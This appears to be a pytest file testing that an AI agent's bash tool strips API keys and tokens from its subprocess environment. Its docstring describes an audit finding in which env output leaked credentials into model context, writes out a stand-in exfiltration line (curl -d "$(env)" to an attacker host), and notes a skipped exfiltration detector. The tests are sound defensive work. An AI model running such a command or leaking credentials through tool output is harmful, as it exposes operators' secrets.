"""P4.4 — the bash tool does not hand the daemon's secrets to the model.

THE DEFECT (audit, verified-high, both bash.py:143 and :206 filed):
``create_subprocess_exec`` was called with no ``env=``, so the child inherited the
daemon's ENTIRE environment. ``env``, ``printenv`` or ``echo $PROMETHEUS_API_TOKEN``
— routine debugging moves for a model — put the Bearer API token, the gateway
tokens and every provider key into the tool result, and from there into model
context, the outbound chat reply, the durable session store and the LCM history.
At user origin the exfiltration detector is skipped entirely (checker.py:820) and
``curl`` is not an approve-pattern, so ``curl -d "$(env)" https://attacker`` was a
single allowed call.

The README already claimed this was handled — "tool sandboxes strip API keys from
the environment — the agent cannot read its own credentials" and "the agent can't
`env` its own keys" — while only the coding sandbox actually did it. These tests
make the code match the standing claim.

BOTH DIRECTIONS. A denylist that strips too much is not a safer control, it is an
outage that gets routed around: an unusable sanctioned path teaches the model to
reach for something with no boundary at all (the argument denied_prune's module
docstring makes about refusing searches). So the capability half is pinned as
hard as the secret half.
"""

from __future__ import annotations

import asyncio
import os
from pathlib import Path

import pytest

from prometheus.security.env_scrub import (
    is_secret_name,
    scrubbed_env,
    scrubbed_names,
)
from prometheus.tools.base import ToolExecutionContext
from prometheus.tools.builtin.bash import BashTool

# ── The real corpus: every secret-shaped name this codebase actually reads ──
# Taken from providers/registry.py, the PROMETHEUS_*_TOKEN gateway family and the
# *_KEY_FILE indirection family, so the denylist is checked against names that
# exist rather than names someone imagined.
REAL_SECRET_NAMES = [
    # provider keys (CLOUD_DEFAULTS / *_API_KEY family)
    "ANTHROPIC_API_KEY", "OPENAI_API_KEY", "DASHSCOPE_API_KEY", "DEEPSEEK_API_KEY",
    "GEMINI_API_KEY", "QWEN_API_KEY", "XAI_API_KEY", "ZAI_API_KEY",
    "MIMO_API_KEY", "MOONSHOT_API_KEY",
    "KLING_ACCESS_KEY", "KLING_SECRET_KEY",
    # gateway tokens
    "PROMETHEUS_API_TOKEN", "PROMETHEUS_TELEGRAM_TOKEN",
    "PROMETHEUS_DISCORD_TOKEN", "PROMETHEUS_SLACK_APP_TOKEN",
    "PROMETHEUS_SLACK_BOT_TOKEN", "PROMETHEUS_GITHUB_TOKEN",
    "TELEGRAM_BOT_TOKEN", "SLACK_BOT_TOKEN",
    # the *_FILE indirection — a path to a secret is secret-shaped
    "PROMETHEUS_ANTHROPIC_KEY_FILE", "PROMETHEUS_OPENAI_KEY_FILE",
    "PROMETHEUS_TELEGRAM_TOKEN_FILE",
    # a Slack/Discord webhook URL embeds its token in the path
    "DISCORD_WEBHOOK_URL", "SLACK_WEBHOOK_URL",
    # generic shapes an operator may add
    "DATABASE_PASSWORD", "DB_PASSWD", "MY_SECRET", "AWS_CREDENTIAL",
    "SIGNING_KEY", "TOKEN", "TOKENS",
]

# ── And everything that must KEEP working ──────────────────────────────────
MUST_KEEP_NAMES = [
    # The operator's note was explicit: PATH, HOME, LANG and the rest stay.
    "PATH", "HOME", "LANG", "LC_ALL", "LC_CTYPE", "TZ", "TMPDIR", "SHELL",
    "USER", "TERM", "PWD", "DISPLAY", "COLORTERM", "EDITOR", "VISUAL",
    "XDG_CACHE_HOME", "XDG_CONFIG_HOME", "XDG_DATA_HOME",
    "PYTHONPATH", "VIRTUAL_ENV",
    # git/ssh/proxy: an allowlist would have broken these, which is why this is
    # a denylist at all.
    "GIT_SSH_COMMAND", "SSH_AUTH_SOCK", "HTTP_PROXY", "HTTPS_PROXY", "NO_PROXY",
    # PROMETHEUS_* config that is NOT a secret — paths, ports, dirs, flags.
    "PROMETHEUS_CONFIG_DIR", "PROMETHEUS_DATA_DIR", "PROMETHEUS_LOGS_DIR",
    "PROMETHEUS_ARTIFACTS_DIR", "PROMETHEUS_DOCUMENTS_DIR",
    "PROMETHEUS_FILES_ROOT", "PROMETHEUS_NODE_DIR",
    "PROMETHEUS_SYSTEMD_USER_DIR", "PROMETHEUS_WORKSPACE_DIR",
    "PROMETHEUS_WIKI", "PROMETHEUS_VAULT", "PROMETHEUS_DB",
    "PROMETHEUS_ENV_FILE", "PROMETHEUS_TRACING",
    "PROMETHEUS_WEB_API_PORT", "PROMETHEUS_WEB_WS_PORT",
    # an id is not a credential
    "TELEGRAM_CHAT_ID",
    # WORD-BOUNDARY TRAPS. These are the reason TOKEN and KEY are anchored:
    # TOKENIZERS_PARALLELISM is a real HuggingFace variable and stripping it
    # silently changes ML tooling behaviour; KEYBOARD/MONKEY are the classic
    # substring false positives.
    "TOKENIZERS_PARALLELISM", "TOKENIZER", "TOKEN_COUNT", "TOKENS_PER_SEC",
    "KEYBOARD", "KEYNOTE", "KEYSTROKE", "KEYS", "KEYRING_PATH",
    "MONKEY", "DONKEY", "HOCKEY", "TURKEY",
]


class TestTheDenylistIsRight:
    @pytest.mark.parametrize("name", REAL_SECRET_NAMES)
    def test_every_real_secret_name_is_stripped(self, name):
        assert is_secret_name(name), f"{name} would reach the model"

    @pytest.mark.parametrize("name", MUST_KEEP_NAMES)
    def test_nothing_legitimate_is_stripped(self, name):
        """The capability half. A control that breaks the tool gets disabled."""
        assert not is_secret_name(name), (
            f"{name} is not a secret but would be stripped — over-broad matching"
        )

    def test_scrubbed_env_returns_a_complete_environment(self):
        """subprocess env= REPLACES rather than merges, so a partial dict would
        strip PATH and break every command. This is the footgun the helper has to
        avoid by construction."""
        base = {"PATH": "/usr/bin", "HOME": "/home/x", "OPENAI_API_KEY": "sk-zzz"}
        out = scrubbed_env(base)
        assert out["PATH"] == "/usr/bin"
        assert out["HOME"] == "/home/x"
        assert "OPENAI_API_KEY" not in out

    def test_scrubbed_names_reports_names_never_values(self):
        base = {"PATH": "/usr/bin", "MY_SECRET": "hunter2-value"}
        names = scrubbed_names(base)
        assert names == ["MY_SECRET"]
        assert "hunter2-value" not in str(names), (
            "a helper that exists to keep secrets out of context must not echo "
            "them into a log line"
        )

    def test_extra_keep_is_honoured_and_explicit(self):
        """The escape hatch a caller uses when it has a deliberate reason — and
        the reason is written at the call site, not hidden in the helper."""
        base = {"MY_TOKEN": "t", "PATH": "/bin"}
        assert "MY_TOKEN" not in scrubbed_env(base)
        assert scrubbed_env(base, extra_keep=("MY_TOKEN",))["MY_TOKEN"] == "t"


class TestTheBashToolDoesNotLeak:
    """End to end through the REAL tool, with real-looking secrets planted in the
    environment. Asserting on the command's OUTPUT, not on an internal call — the
    output is what enters model context."""

    @pytest.fixture()
    def planted_secrets(self, monkeypatch):
        monkeypatch.setenv("PROMETHEUS_API_TOKEN", "FAKE-BEARER-do-not-leak-1")
        monkeypatch.setenv("OPENAI_API_KEY", "FAKE-sk-do-not-leak-2")
        monkeypatch.setenv("TELEGRAM_BOT_TOKEN", "FAKE-bot-do-not-leak-3")
        monkeypatch.setenv("DISCORD_WEBHOOK_URL", "https://x/FAKE-hook-do-not-leak-4")
        # And a value that must survive, so the test cannot pass by emptying
        # the environment.
        monkeypatch.setenv("MARKER_KEEPME", "visible-on-purpose")

    def _run(self, command: str, tmp_path: Path) -> str:
        tool = BashTool(workspace=[str(tmp_path)])
        return asyncio.run(tool.execute(
            BashTool.input_model(command=command),
            ToolExecutionContext(cwd=tmp_path),
        )).output

    def test_env_does_not_contain_the_secrets(self, planted_secrets, tmp_path):
        out = self._run("env", tmp_path)
        for needle in ("do-not-leak-1", "do-not-leak-2", "do-not-leak-3", "do-not-leak-4"):
            assert needle not in out, f"`env` leaked {needle}"
        for name in ("PROMETHEUS_API_TOKEN", "OPENAI_API_KEY",
                     "TELEGRAM_BOT_TOKEN", "DISCORD_WEBHOOK_URL"):
            assert name not in out, f"`env` still names {name}"

    def test_printenv_and_direct_expansion_are_also_empty(self, planted_secrets, tmp_path):
        assert "do-not-leak-1" not in self._run("printenv", tmp_path)
        assert self._run("echo [$PROMETHEUS_API_TOKEN]", tmp_path).strip() == "[]", (
            "the variable still expands — it was not removed from the child env"
        )

    def test_the_environment_is_not_simply_emptied(self, planted_secrets, tmp_path):
        """The other failure mode: a fix that passes by handing the child nothing.
        That would break every command, so pin that ordinary variables survive."""
        assert "visible-on-purpose" in self._run("echo $MARKER_KEEPME", tmp_path)

    def test_ordinary_commands_still_work(self, planted_secrets, tmp_path):
        assert "hello-world" in self._run("echo hello-world", tmp_path)
        assert str(tmp_path) in self._run("pwd", tmp_path)

    def test_path_and_home_survive_so_tools_keep_working(self, planted_secrets, tmp_path):
        out = self._run("echo $PATH", tmp_path)
        assert os.environ["PATH"] in out, "PATH was stripped — every command breaks"
        assert self._run("echo $HOME", tmp_path).strip(), "HOME was stripped"

    def test_a_subshell_cannot_recover_the_secret_from_the_parent(
        self, planted_secrets, tmp_path
    ):
        """The leak is closed at the process boundary, not just in this shell:
        a child of the child inherits the scrubbed env too."""
        out = self._run("bash -c 'echo [$PROMETHEUS_API_TOKEN]'", tmp_path)
        assert "do-not-leak-1" not in out
        assert out.strip().endswith("[]")
